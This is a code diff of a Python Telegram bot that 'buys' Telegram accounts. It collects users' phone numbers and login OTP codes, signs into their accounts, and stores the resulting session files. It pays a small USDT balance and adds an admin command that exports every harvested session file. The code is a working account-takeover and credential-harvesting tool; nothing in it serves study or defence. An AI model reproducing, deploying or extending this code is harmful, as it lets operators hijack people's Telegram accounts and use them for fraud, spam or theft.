@@ -19,16 +19,17 @@ if not os.path.exists(SESSIONS_DIR):
 
 user_data = {}
 
-# Flask Server
+# Flask Server for Render Persistence
 app = Flask(__name__)
 @app.route('/')
-def home(): return "Bot is Online and Ready"
+def home(): return "Bot is Online"
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
 
-# ============ BOT CLIENT ============
+# ============ BOT CLIENT INITIALIZATION ============
+# নতুন ইভেন্ট লুপ তৈরি করা হয়েছে যাতে RuntimeError না আসে
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop).start(bot_token=BOT_TOKEN)
@@ -67,59 +68,67 @@ async def send_main_menu(event):
     if hasattr(event, 'edit'): await event.edit(text, buttons=buttons)
     else: await event.respond(text, buttons=buttons)
 
-# ============ IMPROVED SELL ACCOUNT LOGIC ============
+# ============ SELL ACCOUNT & CONVERSATION ============
 @bot.on(events.CallbackQuery(data=b"sell_acc"))
-async def sell_account(event):
+async def sell_account_init(event):
     user_id = event.sender_id
     async with bot.conversation(user_id, timeout=300) as conv:
         try:
-            await conv.send_message("📲 **Please send your phone number with country code (e.g., +880...):**")
-            phone_response = await conv.get_response()
-            phone = phone_response.text.strip().replace(" ", "")
+            await conv.send_message("📲 **Send your phone number with country code (+880...):**")
+            phone_msg = await conv.get_response()
+            phone = phone_msg.text.strip().replace(" ", "")
             
             await conv.send_message("⏳ *Connecting to Telegram... Please wait.*")
-            
-            # Create a temporary client for the user
             temp_client = TelegramClient(f'{SESSIONS_DIR}/{phone}', API_ID, API_HASH, loop=loop)
             await temp_client.connect()
             
-            # Request OTP
+            # Requesting Code
             send_code = await temp_client.send_code_request(phone)
+            await conv.send_message("🔢 **Enter the 5-digit OTP code you received:**\n*(Directly type the numbers)*")
+            otp_msg = await conv.get_response()
+            otp = otp_msg.text.strip()
             
-            await conv.send_message("🔢 **Enter the 5-digit OTP code sent to your Telegram app:**")
-            otp_response = await conv.get_response()
-            otp = otp_response.text.strip()
-            
-            # Signing in
+            # Login
             await temp_client.sign_in(phone, otp, phone_code_hash=send_code.phone_code_hash)
             
-            # Adding Balance
+            # Balance Update
             if user_id not in user_data: user_data[user_id] = {'balance': 0.0}
             user_data[user_id]['balance'] += 0.30
             
-            # Success Message (Same as your old version)
-            await conv.send_message(f"✅ **Account Added Successfully:**\n`{phone}`\n💰 0.30$ added to your balance.")
-            
-            # Admin Alert
-            await bot.send_message(ADMIN_ID, f"🚀 **New Account Linked!**\nPhone: `{phone}`\nUser: `{user_id}`")
-            
+            await conv.send_message(f"✅ **Account Added Successfully!**\n💰 0.30$ added to your balance.\nCurrent Balance: `{user_data[user_id]['balance']:.2f}$`")
+            await bot.send_message(ADMIN_ID, f"🚀 **New Session!**\nPhone: `{phone}`\nUser: `{user_id}`")
             await temp_client.disconnect()
             
         except Exception as e:
-            await conv.send_message(f"❌ **Error:** {str(e)}\n*Please try again correctly.*")
+            await conv.send_message(f"❌ **Error:** {str(e)}")
 
+# ============ CALLBACK HANDLERS ============
 @bot.on(events.CallbackQuery)
-async def others(event):
+async def callback_handler(event):
     user_id = event.sender_id
     if user_id not in user_data: user_data[user_id] = {'balance': 0.0}
-    
+
     if event.data == b"acc_info":
         bal = user_data[user_id]['balance']
-        await event.edit(f"👤 **Your Account Info**\n\nUser ID: `{user_id}`\nBalance: `{bal:.2f}$` USDT", buttons=[Button.inline("⬅️ Back", b"main_menu")])
+        await event.edit(f"👤 **Account Info**\n\nUser ID: `{user_id}`\nBalance: `{bal:.2f}$` USDT", buttons=[Button.inline("⬅️ Back", b"main_menu")])
     elif event.data == b"about":
-        await event.edit("ℹ️ **About Bot**\nThis bot buys Telegram sessions.\n\nCreated By: @ToxicNexo", buttons=[Button.inline("⬅️ Back", b"main_menu")])
+        await event.edit("ℹ️ **About Bot**\nCreated By: @ToxicNexo", buttons=[Button.inline("⬅️ Back", b"main_menu")])
     elif event.data == b"main_menu":
         await send_main_menu(event)
+    elif event.data == b"withdraw":
+        if user_data[user_id]['balance'] < 1.0:
+            await event.answer("❌ Minimum withdrawal is 1$", alert=True)
+        else:
+            await event.respond("💳 Send your USDT (BEP20) address:")
+
+# ============ ADMIN PANEL ============
+@bot.on(events.NewMessage(pattern='/adminpanel'))
+async def admin_panel(event):
+    if event.sender_id != ADMIN_ID: return
+    files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
+    if not files: await event.respond("📁 No sessions found.")
+    else:
+        for f in files: await bot.send_file(ADMIN_ID, f"{SESSIONS_DIR}/{f}", caption=f"📄 Session: `{f}`")
 
 if __name__ == '__main__':
     t = Thread(target=run_flask)
@@ -127,4 +136,3 @@ if __name__ == '__main__':
     t.start()
     print("Bot is Starting...")
     bot.run_until_disconnected()
-    
